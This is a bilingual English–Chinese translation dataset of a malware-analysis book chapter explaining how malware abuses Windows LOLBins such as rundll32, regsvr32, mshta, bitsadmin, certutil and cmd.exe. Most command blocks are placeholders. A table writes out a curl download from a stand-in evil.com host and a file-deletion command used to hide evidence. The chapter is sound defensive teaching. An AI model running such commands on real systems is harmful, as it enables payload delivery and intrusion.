  type: TYPE_NORMAL
  zh: 接下来，使用一个<samp class="SANS_TheSansMonoCd_W5Regular_11">for</samp>循环，代码通过使用<samp
    class="SANS_TheSansMonoCd_W5Regular_11">WriteProcessMemory</samp> ❺将每个字节的shellcode写入新分配的内存区域。最后，宏代码通过调用<samp
    class="SANS_TheSansMonoCd_W5Regular_11">CreateRemoteThread</samp> ❻在*rundll32.exe*的上下文中执行注入的shellcode。如果你还记得[第12章](chapter12.xhtml)，你可能会发现这是一种shellcode注入的形式。
- en: The *rundll32.exe* utility is one of the many LOLBins that exist in a Windows
    environment. (You’ll read more about it shortly.) In this case, the Cobalt Strike
    stager is using *rundll32.exe* as a sort of surrogate for its malicious code,
    hiding the code inside this process and potentially evading endpoint defense controls
    and pesky security analysts in the process.
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: '*rundll32.exe* 工具是 Windows 环境中许多 LOLBins 之一。（你很快会了解更多关于它的信息。）在这个例子中，Cobalt
    Strike 的加载器将 *rundll32.exe* 作为其恶意代码的代理，将代码隐藏在该进程中，从而潜在地规避终端防御控制和令人生厌的安全分析人员。'
- en: Next, we’ll discuss another technique to mask malicious code by abusing legitimate
    Windows utilities through the use of System Binary Proxy Execution.
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将讨论通过滥用合法的 Windows 工具，利用系统二进制代理执行技术来掩盖恶意代码的另一种技巧。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">System Binary Proxy
    Execution</samp>
  id: totrans-60
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">系统二进制代理执行</samp>
- en: '*System Binary Proxy Execution* is a technique for executing code via a legitimate
    (and often digitally signed) Windows utility. One of the reasons for proxying
    execution through a signed binary is to bypass application-blocking controls like
    AppLocker. This type of attack can also help malware fly under the radar of endpoint
    defenses like anti-malware. This technique can abuse these file types:'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: '*系统二进制代理执行* 是一种通过合法（且通常经过数字签名的）Windows 工具执行代码的技术。通过签名的二进制文件代理执行的原因之一是绕过像 AppLocker
    这样的应用程序阻止控制。这种攻击方式还可以帮助恶意软件避开反恶意软件等终端防御。这种技术可以滥用以下文件类型：'
- en: Binaries that are included by default in most Windows installations and thus
    exist in the vast majority of victim environments.
  id: totrans-62
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 默认包含在大多数 Windows 安装中的二进制文件，因此在绝大多数受害者环境中存在。
- en: Binaries that are not included by default in Windows but are still very common.
    Examples are PSExec, a popular tool for system administration, and ProcDump, a
    tool for dumping the memory of a target process. As these utilities may or may
    not exist in the victim environment prior to the attack, they may need to be transferred
    to the victim system before being invoked. They won’t be discussed further in
    this book.
  id: totrans-63
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Windows 默认不包含但仍然非常常见的二进制文件。例如，PSExec 是一个用于系统管理的流行工具，ProcDump 是一个用于转储目标进程内存的工具。由于这些工具可能在攻击前的受害者环境中不存在，因此在调用之前可能需要将它们传输到受害者系统中。本书中不会进一步讨论这些工具。
- en: Let’s start taking a look at some of the most commonly used LOLBins for proxying
    execution.
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们开始看看一些最常用的 LOLBins，用于代理执行。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Rundll32</samp>
  id: totrans-65
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Rundll32</samp>
- en: '*Rundll32*, which you saw in the Cobalt Strike example, is an important binary
    used by many Windows applications to execute code from DLLs. If an application
    requires a specific DLL but does not load it directly (via <samp class="SANS_TheSansMonoCd_W5Regular_11">LoadLibrary</samp>,
    for example), it can invoke *rundll32.exe* and a specific exported function, like
    so:'
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: '*Rundll32*，正如你在 Cobalt Strike 示例中看到的，是许多 Windows 应用程序用来执行 DLL 中代码的重要二进制文件。如果一个应用程序需要特定的
    DLL，但并不直接加载它（例如，通过 <samp class="SANS_TheSansMonoCd_W5Regular_11">LoadLibrary</samp>），它可以调用
    *rundll32.exe* 并执行一个特定的导出函数，方式如下：'
- en: '[PRE2]'
  id: totrans-67
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'As you can see, rundll32 accepts two parameters: the name and path of the DLL
    file (in this case, *library.dll*) and the exported function that will be executed
    (<samp class="SANS_TheSansMonoCd_W5Regular_11">ExportedFunction</samp>). Malware
    can abuse *rundll32.exe* to execute code from a malicious DLL as well:'
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，rundll32 接受两个参数：DLL 文件的名称和路径（在本例中是 *library.dll*），以及将被执行的导出函数（<samp class="SANS_TheSansMonoCd_W5Regular_11">ExportedFunction</samp>）。恶意软件也可以滥用
    *rundll32.exe* 从恶意 DLL 执行代码：
- en: '[PRE3]'
  id: totrans-69
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: Since rundll32 is run very frequently by the Windows operating system and various
    other benign processes, it is often used as a surrogate process for malicious
    code. In the Cobalt Strike stager example, it was spawned and injected with shellcode,
    then used to host and execute malicious code.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 由于 rundll32 被 Windows 操作系统及其他各种无害进程频繁调用，它常常被用作恶意代码的代理进程。在 Cobalt Strike 的加载器示例中，它被启动并注入了
    shellcode，然后用于托管和执行恶意代码。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Regsvr32</samp>
  id: totrans-71
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Regsvr32</samp>
- en: '*Regsvr32* is an executable used to register and unregister DLL modules. Malware
    can take advantage of regsvr32 to execute malicious code within the context of
    the *regsvr32.exe* signed binary or even to download and execute malicious code
    from a remote server.'
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: '*Regsvr32* 是一个可执行文件，用于注册和注销 DLL 模块。恶意软件可以利用 regsvr32 在 *regsvr32.exe* 签名二进制文件的上下文中执行恶意代码，甚至从远程服务器下载并执行恶意代码。'
- en: 'The Emotet malware family is notorious for using LOLBins as part of its attack
    chain. The payload for one particular strain of Emotet (<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256:
    d642109e621c6758027c2fc0e5ea3d1126963a001ab1858b95f82e09403943bd</samp>) was being
    delivered via malicious Microsoft Excel documents that downloaded multiple payloads
    and modules and subsequently executed them using *regsvr32.exe*. [Figure 15-3](chapter15.xhtml#fig15-3),
    a screenshot from Joe Sandbox, illustrates this attack chain.'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 'Emotet 恶意软件家族以在其攻击链中使用 LOLBins 而闻名。某个特定变种的 Emotet 的有效负载（<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256:
    d642109e621c6758027c2fc0e5ea3d1126963a001ab1858b95f82e09403943bd</samp>）是通过恶意的
    Microsoft Excel 文档传送的，这些文档会下载多个有效负载和模块，并随后通过 *regsvr32.exe* 执行它们。[图 15-3](chapter15.xhtml#fig15-3)
    是来自 Joe Sandbox 的截图，展示了这一攻击链。'
- en: '![](../images/fig15-3.jpg)'
  id: totrans-74
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/fig15-3.jpg)'
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-3: The Emotet process
    tree shown in Joe Sandbox</samp>'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Book_Oblique_I_11">图 15-3：在 Joe Sandbox 中显示的 Emotet
    进程树</samp>
- en: 'Another notable example of regsvr32 in use is the strangely named Squiblydoo
    attack, which also leverages the Windows script component runtime DLL *scrobj.dll*
    that is normally used to execute local COM scriptlets. By combining the power
    of *regsvr32.exe* and *scrobj.dll*, the Squiblydoo malware downloads and executes
    a malicious COM scriptlet directly from the internet:'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个值得注意的 regsvr32 使用示例是名为 Squiblydoo 的攻击，该攻击也利用了 Windows 脚本组件运行时 DLL *scrobj.dll*，该
    DLL 通常用于执行本地 COM 脚本片段。通过结合 *regsvr32.exe* 和 *scrobj.dll* 的强大功能，Squiblydoo 恶意软件可以直接从互联网下载并执行恶意的
    COM 脚本片段：
- en: '[PRE4]'
  id: totrans-77
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: This command downloads the malicious script *script.sct* from *http://<wbr>evil<wbr>.kz*
    and subsequently executes it using *scrobj.dll*, all while hiding inside the process
    address space of *regsvr32.exe*, completely in memory. More specifically, the
    <samp class="SANS_TheSansMonoCd_W5Regular_11">/s</samp> switch tells *regsvr32.exe*
    not to display a message to the victim (unwanted behavior for a threat actor).
    The <samp class="SANS_TheSansMonoCd_W5Regular_11">/i</samp> switch passes the
    following string (<samp class="SANS_TheSansMonoCd_W5Regular_11">http://evile.kz</samp>...)
    to the <samp class="SANS_TheSansMonoCd_W5Regular_11">DllInstall</samp> function
    inside *scrobj.dll*.
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 该命令从 *http://<wbr>evil<wbr>.kz* 下载恶意脚本 *script.sct*，并随后通过 *scrobj.dll* 执行该脚本，所有操作都在
    *regsvr32.exe* 的进程地址空间内进行，完全在内存中。更具体地说，<samp class="SANS_TheSansMonoCd_W5Regular_11">/s</samp>
    开关告诉 *regsvr32.exe* 不向受害者显示消息（这是威胁行为者不希望出现的行为）。<samp class="SANS_TheSansMonoCd_W5Regular_11">/i</samp>
    开关将以下字符串（<samp class="SANS_TheSansMonoCd_W5Regular_11">http://evile.kz</samp>...）传递给
    *scrobj.dll* 中的 <samp class="SANS_TheSansMonoCd_W5Regular_11">DllInstall</samp>
    函数。
- en: This technique is able to work the way it does because the <samp class="SANS_TheSansMonoCd_W5Regular_11">DllInstall</samp>
    function inside the *scrobj.dll* file accepts a URL and blindly downloads and
    executes the script file. You can read more about the Squiblydoo technique at
    the MITRE Cyber Analytics Repository (CAR) at [*https://<wbr>car<wbr>.mitre<wbr>.org<wbr>/analytics<wbr>/CAR<wbr>-2019<wbr>-04<wbr>-003<wbr>/*](https://car.mitre.org/analytics/CAR-2019-04-003/).
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 这一技术能够实现其功能，是因为 *scrobj.dll* 文件中的 <samp class="SANS_TheSansMonoCd_W5Regular_11">DllInstall</samp>
    函数接受一个 URL，并盲目下载并执行脚本文件。你可以在 MITRE 网络分析库（CAR）中了解更多关于 Squiblydoo 技术的信息，网址为 [*https://<wbr>car<wbr>.mitre<wbr>.org<wbr>/analytics<wbr>/CAR<wbr>-2019<wbr>-04<wbr>-003<wbr>/*](https://car.mitre.org/analytics/CAR-2019-04-003/)。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Mshta</samp>
  id: totrans-80
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Mshta</samp>
- en: 'Mshta is used to execute *HTML application* (.*hta*) files, which are script
    files that can contain HTML, VBScript, JavaScript, or other types of scripts.
    HTA files provide a GUI via HTML, and the script code provides the logic for the
    application. Malware often uses *mshta.exe* to download and execute files from
    remote servers, as in the following example from a malware-dropping Microsoft
    Excel file:'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: Mshta 用于执行 *HTML 应用程序*（.*hta*）文件，这些脚本文件可以包含 HTML、VBScript、JavaScript 或其他类型的脚本。HTA
    文件通过 HTML 提供图形用户界面，脚本代码则提供应用程序的逻辑。恶意软件通常使用 *mshta.exe* 从远程服务器下载并执行文件，以下是一个来自恶意微软
    Excel 文件的示例：
- en: '[PRE5]'
  id: totrans-82
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'One particular malware sample (<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256:
    03f03a3f36c87d8cb7cd5f8ce6e324917253eeca4f3ea164f35242146e26e2b1</samp>) invokes
    *mshta.exe* via *rundll32.exe*, demonstrating how some attacks chain multiple
    LOLBins together. [Figure 15-4](chapter15.xhtml#fig15-4) shows the report from
    Joe Sandbox (*[https://www.joesandbox.com/analysis/670279](https://www.joesandbox.com/analysis/670279)*).'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: '一个特定的恶意软件样本（<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256: 03f03a3f36c87d8cb7cd5f8ce6e324917253eeca4f3ea164f35242146e26e2b1</samp>）通过
    *mshta.exe* 调用 *rundll32.exe*，展示了某些攻击如何将多个 LOLBin 链接在一起。[图 15-4](chapter15.xhtml#fig15-4)
    显示了来自 Joe Sandbox 的报告（* [https://www.joesandbox.com/analysis/670279](https://www.joesandbox.com/analysis/670279)
    *）。'
- en: '![](../images/fig15-4.jpg)'
  id: totrans-84
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/fig15-4.jpg)'
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-4: A LOLBin attack
    chain shown in an analysis report from Joe Sandbox</samp>'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Book_Oblique_I_11">图 15-4：Joe Sandbox 分析报告中显示的
    LOLBin 攻击链</samp>
- en: In this sandbox analysis, you can see that a Microsoft Excel document spawns
    *rundll32.exe* (likely via embedded VBA code or a similar technique), which subsequently
    invokes *mshta.exe* to download and execute a file hosted on *mediafire.net*.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 在此沙箱分析中，您可以看到一个 Microsoft Excel 文档启动 *rundll32.exe*（可能通过嵌入的 VBA 代码或类似技术），然后调用
    *mshta.exe* 从 *mediafire.net* 下载并执行文件。
- en: '##### <samp class="SANS_Futura_Std_Bold_Condensed_B_11">BITSAdmin</samp>'
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: '##### <samp class="SANS_Futura_Std_Bold_Condensed_B_11">BITSAdmin</samp>'
- en: '*Background Intelligence Transfer Service (BITS)* is used to transfer files
    to and from web servers and file shares. BITS can be configured in “jobs” that
    automatically manage the file transfer overhead, monitoring network usage, latency,
    and file sizes and allowing file transfers to be paused and resumed. The BITSAdmin
    application, *bitsadmin.exe*, is used to manage BITS.'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: '*背景智能传输服务 (BITS)* 用于将文件传输到 Web 服务器和文件共享之间。BITS 可以通过“作业”进行配置，自动管理文件传输开销，监控网络使用、延迟和文件大小，并允许暂停和恢复文件传输。BITSAdmin
    应用程序，*bitsadmin.exe*，用于管理 BITS。'
- en: 'Malware can abuse BITS to download and execute payloads from remote servers.
    The following command will create a new file transfer job called <samp class="SANS_TheSansMonoCd_W5Regular_11">myjob</samp>
    as a high priority, then download the file *malicious.exe* from the domain *evil.uk*,
    saving it in the *C:\Users\AppData\Roaming* directory:'
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件可以滥用 BITS 从远程服务器下载并执行有效载荷。以下命令将创建一个名为 <samp class="SANS_TheSansMonoCd_W5Regular_11">myjob</samp>
    的新文件传输作业，并将其设置为高优先级，然后从 *evil.uk* 域下载 *malicious.exe* 文件，并将其保存在 *C:\Users\AppData\Roaming*
    目录中：
- en: '[PRE6]'
  id: totrans-90
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">InstallUtil</samp>
  id: totrans-91
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">InstallUtil</samp>
- en: '*InstallUtil* is a component of the Windows .NET framework and is used by the
    operating system and other applications to install server resources and services.
    It can also be used by malware to invoke executable and DLL files. The following
    command executes *evil.dll* in the context of *installutil.exe*:'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: '*InstallUtil* 是 Windows .NET 框架的一个组件，操作系统和其他应用程序用它来安装服务器资源和服务。恶意软件也可以利用它来调用可执行文件和
    DLL 文件。以下命令在 *installutil.exe* 的上下文中执行 *evil.dll*：'
- en: '[PRE7]'
  id: totrans-93
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: A host may have many versions of .NET installed, so <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">version</samp>
    here would be replaced with a specific version such as <samp class="SANS_TheSansMonoCd_W5Regular_11">v4.0.30319</samp>.
    As with many LOLBins, *installutil.exe* is often used by system administrators
    for legitimate reasons, so it’s difficult to prevent this unauthorized usage,
    especially if it means limiting how administrators do their jobs. It’s better
    to either limit the user groups who are able to execute this utility or (at the
    very least) monitor the user groups’ usage of the utility and regularly review
    the logs.
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 主机上可能安装了多个版本的 .NET，因此此处的 <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">version</samp>
    会替换为特定版本，例如 <samp class="SANS_TheSansMonoCd_W5Regular_11">v4.0.30319</samp>。与许多
    LOLBin 一样，*installutil.exe* 常常被系统管理员出于合法目的使用，因此很难防止这种未经授权的使用，特别是当这意味着限制管理员的工作方式时。最好限制可以执行此工具的用户组，或者（至少）监控用户组对该工具的使用并定期审查日志。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Certutil</samp>
  id: totrans-95
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Certutil</samp>
- en: 'The *certutil.exe* binary is part of the Certificate Services component of
    Windows and can be used to display information on, verify, configure, and install
    digital certificates. There are a few interesting ways in which it can be abused
    by attackers. For instance, a malicious Microsoft Excel document (<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256:d009299a787cf9b7995827014e72525038eecd3e1f99820d66854fc865d39047</samp>)
    downloaded and executed a Lokibot payload from a remote server with the following
    command:'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: '*certutil.exe* 二进制文件是 Windows 证书服务组件的一部分，可用于显示信息、验证、配置和安装数字证书。攻击者可以通过几种有趣的方式滥用它。例如，一个恶意的
    Microsoft Excel 文档 (<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256:d009299a787cf9b7995827014e72525038eecd3e1f99820d66854fc865d39047</samp>)
    下载并执行了来自远程服务器的 Lokibot 有效载荷，命令如下：'
- en: '[PRE8]'
  id: totrans-97
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: This command invokes certutil, downloads an executable file (*Zcldxvqciopgykje.exe*)
    from a web server (45.155.165.63), and executes it.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 该命令调用 certutil，从 Web 服务器（45.155.165.63）下载一个可执行文件 (*Zcldxvqciopgykje.exe*)，并执行它。
- en: 'Malware can also use certutil to encode or decode a file, like so:'
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件也可以使用 certutil 来编码或解码文件，方法如下：
- en: '[PRE9]'
  id: totrans-100
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: The <samp class="SANS_TheSansMonoCd_W5Regular_11">-encode</samp> switch tells
    certutil to Base64-encode the file (we’ll talk about Base64 in [Chapter 16](chapter16.xhtml)).
    Encoding a file this way can serve as a crude method to hide a file on disk or
    to obfuscate data before exfiltrating it from the network in order to bypass network
    defenses. Certutil is a great example of a multipurpose LOLBin.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_TheSansMonoCd_W5Regular_11">-encode</samp> 开关告诉 certutil 对文件进行
    Base64 编码（我们将在[第 16 章](chapter16.xhtml)中讨论 Base64）。以这种方式编码文件可以作为一种粗略的方法，将文件隐藏在磁盘上，或者在从网络中导出数据时混淆数据，以绕过网络防御。Certutil
    是多用途 LOLBin 的一个很好的例子。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Windows Script Host</samp>
  id: totrans-102
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Windows 脚本宿主</samp>
- en: 'Windows includes several built-in utilities as part of the *Windows Script
    Host (WSH)* for running scripting languages such as VBScript (*.vbs* and *.vbe*
    files) and JavaScript (*.js* and *.jse* files). Utilities such as *wscript.exe*
    and *cscript.exe* are part of the WSH. These utilities can be executed from the
    command line or spawned as a new process and used to run various types of script
    files. Scripting is much simpler than coding an executable in, for instance, C++,
    so some malware takes advantage of this. One example, a Microsoft Word document
    (<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256: ccc8d5aa5d1a682c20b0806948bf06d1b5d11961887df70c8902d2146c6d1481</samp>)
    with embedded code, drops a JavaScript file to disk and executes the script using
    *wscript.exe* with this command:'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 'Windows 包含多个内置工具，作为 *Windows 脚本宿主（WSH）* 的一部分，用于运行脚本语言，如 VBScript（*.vbs* 和 *.vbe*
    文件）和 JavaScript（*.js* 和 *.jse* 文件）。像 *wscript.exe* 和 *cscript.exe* 这样的工具是 WSH
    的一部分。这些工具可以从命令行执行，或者作为新进程启动，用于运行各种类型的脚本文件。与用 C++ 编写可执行文件相比，脚本编写要简单得多，因此一些恶意软件利用了这一点。一个例子是，一个嵌入了代码的
    Microsoft Word 文档 (<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256: ccc8d5aa5d1a682c20b0806948bf06d1b5d11961887df70c8902d2146c6d1481</samp>)
    会将一个 JavaScript 文件写入磁盘，并使用 *wscript.exe* 通过以下命令执行该脚本：'
- en: '[PRE10]'
  id: totrans-104
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: Upon execution, this script downloads a sample from the malware family OriginLogger.
    This malicious document is part of a multistage attack that later invokes *mshta.exe*
    as well.
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 执行时，脚本会从恶意软件家族 OriginLogger 中下载一个样本。这个恶意文档是一个多阶段攻击的一部分，后续还会调用 *mshta.exe*。
- en: 'The *wscript.exe* binary can also be used to execute script files directly
    from NTFS Alternate Data Streams (ADS), which are covered later in this chapter.
    For now, just know that malware can hide files inside ADS, which effectively hides
    them from prying eyes and certain endpoint defenses. To execute a script file
    hidden in another file via an ADS, you’d use the following command:'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: '*wscript.exe* 二进制文件还可以直接从 NTFS 替代数据流（ADS）中执行脚本文件，稍后在本章中会讲到。现在，只需知道恶意软件可以将文件隐藏在
    ADS 中，这有效地将它们隐藏于不被窥探的视野之外，并避开某些终端防御。要执行隐藏在另一文件中的 ADS 中的脚本文件，可以使用以下命令：'
- en: '[PRE11]'
  id: totrans-107
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: Scripts are generally outside the scope of this book, but note that modern threats
    often use scripting languages like JavaScript and VBScript, which can be easily
    executed in Windows with the built-in Windows script interpreters.
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 脚本通常不在本书的范围内，但请注意，现代威胁通常使用像 JavaScript 和 VBScript 这样的脚本语言，这些脚本语言可以通过 Windows
    内置的脚本解释器轻松执行。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Windows Command Line
    and Other Utilities</samp>
  id: totrans-109
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Windows 命令行及其他实用工具</samp>
- en: The built-in Command Prompt (*cmd.exe*), which is the default command line utility
    in Windows, is widely used both for legitimate and malicious purposes. For example,
    malware can use the command line for terminating processes, deleting files, making
    system configuration changes, and deleting backups. Some of the commands it uses
    also could be classified as LOLBin attacks, since *cmd.exe* is often used to execute
    other utilities. Malware often invokes Command Prompt by creating a new process
    (by calling <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateProcess</samp>,
    for instance) and passing in the command that it wishes to run as a parameter.
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 内置的命令提示符（*cmd.exe*），它是Windows中默认的命令行工具，广泛用于合法和恶意目的。例如，恶意软件可以利用命令行终止进程、删除文件、进行系统配置更改以及删除备份。它使用的一些命令也可以归类为LOLBin攻击，因为*cmd.exe*常常用于执行其他工具。恶意软件通常通过创建新进程（例如调用<samp
    class="SANS_TheSansMonoCd_W5Regular_11">CreateProcess</samp>）并将其希望运行的命令作为参数传入来调用命令提示符。
- en: 'Perhaps the most common usage of Command Prompt is to directly execute other
    files and applications. This could look similar to the following code, which invokes
    an executable called *flashplayer.exe*:'
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 命令提示符最常见的使用方式之一是直接执行其他文件和应用程序。下面的代码可能类似于以下内容，它调用了一个名为*flashplayer.exe*的可执行文件：
- en: '[PRE12]'
  id: totrans-112
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: '[Table 15-2](chapter15.xhtml#tab15-2) lists some other commands and utilities
    that are sometimes abused by malware to execute malicious actions. This list is
    by no means exhaustive, as there are many commands that can be invoked with *cmd.exe*.'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: '[表 15-2](chapter15.xhtml#tab15-2)列出了其他一些命令和工具，它们有时会被恶意软件滥用以执行恶意操作。这个列表并不详尽，因为有许多命令可以通过*cmd.exe*调用。'
- en: <samp class="SANS_Futura_Std_Heavy_B_11">Table 15-2:</samp> <samp class="SANS_Futura_Std_Book_11">Utilities
    and Commands Malware May Use</samp>
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Heavy_B_11">表 15-2：</samp> <samp class="SANS_Futura_Std_Book_11">恶意软件可能使用的工具和命令</samp>
- en: '| <samp class="SANS_Futura_Std_Heavy_B_11">Utility/command</samp> | <samp class="SANS_Futura_Std_Heavy_B_11">Example</samp>
    | <samp class="SANS_Futura_Std_Heavy_B_11">Description</samp> |'
  id: totrans-115
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_Futura_Std_Heavy_B_11">工具/命令</samp> | <samp class="SANS_Futura_Std_Heavy_B_11">示例</samp>
    | <samp class="SANS_Futura_Std_Heavy_B_11">描述</samp> |'
- en: '| --- | --- | --- |'
  id: totrans-116
  prefs: []
  type: TYPE_TB
  zh: '| --- | --- | --- |'
- en: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">curl</samp> | <samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe
    /c curl -o output _file</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">https://evil.com/evil.gif</samp>
    | <samp class="SANS_Futura_Std_Book_11">Transfers data. Malware may use it to
    download additional payloads and write them to a file, or to exfiltrate data to
    a remote web server.</samp> |'
  id: totrans-117
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">curl</samp> | <samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe
    /c curl -o output _file</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">https://evil.com/evil.gif</samp>
    | <samp class="SANS_Futura_Std_Book_11">传输数据。恶意软件可能会用它来下载附加载荷并将其写入文件，或将数据外泄到远程Web服务器。</samp>
    |'
- en: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">del</samp> | <samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe
    /c del C:\Users\</samp><samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">David</samp><samp
    class="SANS_TheSansMonoCd_W5Regular_11">\Temp\RegScvs.exe</samp> | <samp class="SANS_Futura_Std_Book_11">Deletes
    files. Malware may use it to remove evidence, such as executables and temporary
    files, from the victim system.</samp> |'
  id: totrans-118
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">del</samp> | <samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe
    /c del C:\Users\</samp><samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">David</samp><samp
    class="SANS_TheSansMonoCd_W5Regular_11">\Temp\RegScvs.exe</samp> | <samp class="SANS_Futura_Std_Book_11">删除文件。恶意软件可能会用它删除证据，如可执行文件和临时文件，从受害者的系统中。</samp>
    |'
- en: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">ipconfig.exe</samp> | <samp
    class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c ipconfig.exe</samp> | <samp
    class="SANS_Futura_Std_Book_11">Displays network configuration settings. Malware</samp>
    <samp class="SANS_Futura_Std_Book_11">could invoke it to retrieve the victim’s
    local IP</samp> <samp class="SANS_Futura_Std_Book_11">address or other network
    information.</samp> |'
  id: totrans-119
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">ipconfig.exe</samp> | <samp
    class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c ipconfig.exe</samp> | <samp
    class="SANS_Futura_Std_Book_11">显示网络配置设置。恶意软件可能会调用它来获取受害者的本地IP地址或其他网络信息。</samp>
    |'
- en: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">ping</samp> | <samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe
    /c ping 8.8.8.8</samp> | <samp class="SANS_Futura_Std_Book_11">Pings a remote
    server. Malware may use it to see whether the victim is connected to the internet
    (as a sandbox detection technique, for example) or to make an initial contact
    to its C2 server.</samp> |'
  id: totrans-120
  prefs: []
  type: TYPE_TB
